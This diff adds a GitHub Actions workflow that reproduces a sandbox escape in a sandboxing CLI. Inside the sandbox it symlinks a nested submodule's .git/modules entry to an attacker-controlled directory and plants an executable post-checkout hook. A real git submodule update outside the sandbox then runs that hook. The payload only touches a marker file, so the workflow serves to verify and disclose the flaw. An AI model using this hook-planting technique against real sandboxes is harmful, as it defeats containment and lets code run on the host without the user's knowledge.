@@ -1,0 +1,86 @@
+name: verify-macos-nested-submodule-poc
+
+on:
+  workflow_dispatch: {}
+
+jobs:
+  poc:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+
+      - name: Build
+        run: npm ci && npm run build
+
+      - name: Set up nested repo with submodule + symlinked modules entry
+        run: |
+          set -euo pipefail
+          mkdir -p work
+          cd work
+          git init -q proj
+          git -C proj -c user.email=a@a -c user.name=a commit -q --allow-empty -m init
+          # Create a bare "origin" for the submodule so `submodule add` works offline.
+          git init -q --bare sub-origin.git
+          git -C proj -c protocol.file.allow=always submodule add -q ../sub-origin.git sub
+          git -C proj -c user.email=a@a -c user.name=a commit -q -m "add submodule"
+          ls -la proj/.git/modules/sub || true
+
+      - name: Write s.json (filesystem-only, no network restriction needed)
+        run: |
+          cat > work/s.json <<'EOF'
+          {"filesystem":{"denyRead":[],"allowWrite":["."],"denyWrite":[]},"network":{"allowedDomains":[],"deniedDomains":[]}}
+          EOF
+
+      - name: Control — direct (non-symlinked) submodule hook write must be DENIED
+        working-directory: work
+        run: |
+          set -x
+          node ../dist/cli.js -s s.json -- sh -c '
+            echo CONTROL_ATTEMPT
+            printf "#!/bin/sh\necho control-should-not-write\n" > proj/.git/modules/sub/hooks/post-checkout 2>&1 && echo CONTROL_WROTE || echo CONTROL_DENIED
+          '
+
+      - name: PoC — symlinked modules entry on a NESTED repo, from inside the sandbox
+        working-directory: work
+        run: |
+          set -x
+          node ../dist/cli.js -s s.json -- sh -c '
+            set -e
+            rm -rf proj/.git/modules/sub
+            mkdir -p evilgd/hooks evilgd/objects evilgd/refs
+            printf "ref: refs/heads/main\n" > evilgd/HEAD
+            ln -s ../../../evilgd proj/.git/modules/sub
+            printf "#!/bin/sh\ntouch /tmp/PWNED_outside_sandbox\n" > proj/.git/modules/sub/hooks/post-checkout
+            chmod +x proj/.git/modules/sub/hooks/post-checkout
+            echo POC_WRITE_EXIT=$?
+          '
+          echo "--- host state after sandbox exited ---"
+          ls -la evilgd/hooks/ || echo "no evilgd/hooks dir"
+          cat evilgd/hooks/post-checkout 2>&1 || echo "hook file absent"
+
+      - name: Trigger — real git submodule update OUTSIDE the sandbox
+        working-directory: work
+        run: |
+          set -x
+          rm -f /tmp/PWNED_outside_sandbox
+          git -C proj -c protocol.file.allow=always submodule update --init --checkout sub || true
+          echo "--- result ---"
+          if [ -f /tmp/PWNED_outside_sandbox ]; then
+            echo "ESCAPED: hook planted inside the sandbox executed OUTSIDE it on a real git operation"
+          else
+            echo "NOT ESCAPED: hook did not execute (finding does not reproduce on this build)"
+          fi
+
+      - name: Summary (always runs, for a clean pass/fail signal even if a prior step's set -e exits)
+        if: always()
+        run: |
+          echo "=== FINAL VERDICT ==="
+          if [ -f /tmp/PWNED_outside_sandbox ]; then
+            echo "VERDICT: REPRODUCED - sandbox write succeeded AND the planted hook executed outside the sandbox."
+          else
+            echo "VERDICT: NOT REPRODUCED on this runner/build."
+          fi
